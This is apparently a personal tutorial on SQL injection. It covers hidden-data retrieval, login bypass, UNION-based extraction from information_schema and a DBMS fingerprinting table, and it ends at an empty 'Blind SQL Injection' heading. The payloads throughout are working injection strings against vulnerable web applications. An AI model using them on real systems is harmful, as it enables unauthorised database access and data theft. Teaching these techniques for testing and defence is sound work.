SQL Injection is a web security vulnerability that allows attacker to change the logic of SQL query from input user. There are four types of SQL Injection attack

### 1. Retrieving Hidden Data
This type, allow attacker to show the forbidden content that it shouldn't show in the user screen. It can happen when the logic on SQL query trying to hide the data by add condition on the query such as `AND released = 1` on the query, so the SQL query on the server it would be like this
			`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
And we can bypass to see all of the products include the products that has not released by use SQL comment in out input. The code should be like this
		`SELECT * FROM products WHERE category = 'Gifts' -- AND released = 1`
It would ignore the command after SQL command `--` 

### 2. Subverting Application Logic
This type, allow attacker to bypass or change the logic of SQL query. This type usually happen on login page. When the SQL query searching for the username and password to check the user input
`SELECT * FROM users WHERE username='$inputUsername' AND password='$inputPassword'` 
We can interfere by add the SQL comment or add the condition that always true, such as `OR 1=1`
`SELECT * FROM users WHERE username='admin'-- AND password='dummy'`
OR
`SELECT * FROM users WHERE username='admin' OR 1=1 -- AND password='dummy'`

### 3. UNION Attacks
This type, allow attacker to merge the output of SQL query on the response  by using `UNION` query on the input. On this attack there are two requirement must be met :
1. The individual queries must return the same number of columns.
2. The data types in each column must be compatible between the individual queries.
To retrieve data that we want to see, there are some step to achieve that.
#### 1. Determining the number of columns required
There are two method to determine how many columns are being returned from the original query.
###### 1. Using ORDER BY
One method involves injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs. For example, if the injection point is a quoted string within the `WHERE` clause of the original query, you would submit:
```
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3-- 
etc.
```
When the specified columns index has exceeds the original column of table, the database returns error, such as :
`The ORDER BY position number 3 is out of range of the number of items in the select list.`

###### 2. Using UNION SELECT
Another method to determine total columns of original table, we can use command `UNION SELECT` by adding number of null values on the input :
```
' UNION SELECT NULL --
' UNION SELECT NULL,NULL --
' UNION SELECT NULL,NULL,NULL --
etc.

For ORACLE
' UNION SELECT NULL,NULL FROM DUAL --
DUAL is built-in table
```
When the number of null has exceeds total of original columns of table, the database would returns error, such as :
`All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`

#### 2. Findings Columns with a useful data type
We can retrieve data type of columns by using `UNION SELECT` 
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
On the example above, it would try data type `string` for every columns. If the data type of columns isn't `string`, it would returns error, such as :
`Conversion failed when converting the varchar value 'a' to data type int.`
#### 3. Identifying DBMS 
There are some way to identify what's DBMS that used by server. First, by execute command on a column index that show up in website

| Command                                         | DBMS                                               |
| ----------------------------------------------- | -------------------------------------------------- |
| conv('a',16,2)=conv('a',16,2)                   | MYSQL                                              |
| connection_id()=connection_id()                 | MYSQL                                              |
| crc32('MySQL')=crc32('MySQL')                   | MYSQL                                              |
| BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)       | MSSQL                                              |
| @@CONNECTIONS>0                                 | MSSQL                                              |
| @@CONNECTIONS=@@CONNECTIONS                     | MSSQL                                              |
| @@CPU_BUSY=@@CPU_BUSY                           | MSSQL                                              |
| USER_ID(1)=USER_ID(1)                           | MSSQL                                              |
| ROWNUM=ROWNUM                                   | ORACLE                                             |
| RAWTOHEX('AB')=RAWTOHEX('AB')                   | ORACLE                                             |
| LNNVL(0=123)                                    | ORACLE                                             |
| 5::int=5                                        | POSTGRESQL                                         |
| 5::integer=5                                    | POSTGRESQL                                         |
| pg_client_encoding()=pg_client_encoding()       | POSTGRESQL                                         |
| get_current_ts_config()=get_current_ts_config() | POSTGRESQL                                         |
| quote_literal(42.5)=quote_literal(42.5)         | POSTGRESQL                                         |
| current_database()=current_database()           | POSTGRESQL                                         |
| sqlite_version()=sqlite_version()               | SQLITE                                             |
| last_insert_rowid()>1                           | SQLITE                                             |
| last_insert_rowid()=last_insert_rowid()         | SQLITE                                             |
| val(cvar(1))=1                                  | MSACCESS                                           |
| IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0               | MSACCESS                                           |
| cdbl(1)=cdbl(1)                                 | MSACCESS                                           |
| 1337=1337                                       | MSACCESS, SQLITE, POSTGRESQL, ORACLE, MSSQL, MYSQL |
| 'i'='i'                                         | MSACCESS, SQLITE, POSTGRESQL, ORACLE, MSSQL, MYSQL |
The other way to identifying DBMS is by read on the error message 

| DBMS                 | Example Error Message                                                                     | Example Payload |
| -------------------- | ----------------------------------------------------------------------------------------- | --------------- |
| PostgreSQL           | `ERROR: unterminated quoted string at or near "'"`                                        | `'`             |
| PostgreSQL           | `ERROR: syntax error at or near "1"`                                                      | `1'`            |
| Microsoft SQL Server | `Unclosed quotation mark after the character string ''.`                                  | `'`             |
| Microsoft SQL Server | `Incorrect syntax near ''.`                                                               | `'`             |
| Microsoft SQL Server | `The conversion of the varchar value to data type int resulted in an out-of-range value.` | `1'`            |
| Oracle               | `ORA-00933: SQL command not properly ended`                                               | `'`             |
| Oracle               | `ORA-01756: quoted string not properly terminated`                                        | `'`             |
| Oracle               | `ORA-00923: FROM keyword not found where expected`                                        | `1'`            |
#### 4. Extract database names, table names, and column names
Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

- **Database Names**
  `-1' UNION SELECT 1, 2, GROUP_CONCAT(0x7C, schema_name, 0x7C) FROM information_schema.schemata`
- **Table Names**
  `-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]`
- **Column Names**
  `-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]`

The `GROUP_CONCAT()` on the query, it would concatenating multiple results in one row. The `information_schema.schemata` table contains multiple rows, each representing a database schema (i.e., a database). Without `GROUP_CONCAT()`, each `schema_name` would be returned as a separate row. But with `GROUP_CONCAT()`, all the schema names are concatenated into a single result.
#### 5. Retrieve Interesting Data
After you found every database and table that has interesting data, you could retrieving data by using these query
`' UNION SELECT 1,[column_name1],[column_name2] FROM users--`

### 4. Blind SQL Injection